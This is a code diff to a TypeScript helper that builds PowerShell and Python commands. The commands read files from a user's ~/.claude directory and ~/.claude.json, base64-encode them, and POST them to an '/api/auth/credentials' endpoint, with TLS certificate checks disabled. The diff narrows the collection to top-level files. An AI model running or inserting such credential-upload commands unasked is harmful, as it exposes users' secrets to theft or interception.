@@ -30,7 +30,7 @@ function uploadCommand(os: OS, origin: string, token: string): string {
 $d="$env:USERPROFILE\\.claude";$j="$env:USERPROFILE\\.claude.json"
 if($PSVersionTable.PSVersion.Major -lt 6){[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}
 $f=@()
-if(Test-Path $d){Get-ChildItem $d -Recurse -File|%{$f+=@{path=$_.FullName.Substring($d.Length+1);content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))}}}
+if(Test-Path $d){Get-ChildItem $d -File|%{$f+=@{path=$_.Name;content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))}}}
 if(Test-Path $j){$f+=@{path=".claude.json";content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($j))}}
 $b=@{bundle=@{files=$f;exportedAt=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")}}|ConvertTo-Json -Depth 10
 $p=if($PSVersionTable.PSVersion.Major -ge 6){@{SkipCertificateCheck=$true}}else{@{}}
@@ -42,7 +42,7 @@ import json,base64,os,datetime
 from pathlib import Path
 d=Path(os.path.expanduser('~/.claude'))
 j=Path(os.path.expanduser('~/.claude.json'))
-f=[{'path':str(p.relative_to(d)),'content':base64.b64encode(p.read_bytes()).decode()} for p in d.rglob('*') if p.is_file()] if d.exists() else []
+f=[{'path':p.name,'content':base64.b64encode(p.read_bytes()).decode()} for p in d.iterdir() if p.is_file()] if d.exists() else []
 if j.exists():f.append({'path':'.claude.json','content':base64.b64encode(j.read_bytes()).decode()})
 print(json.dumps({'bundle':{'files':f,'exportedAt':datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}}))
 " | curl -s -X POST "${origin}/api/auth/credentials" \\
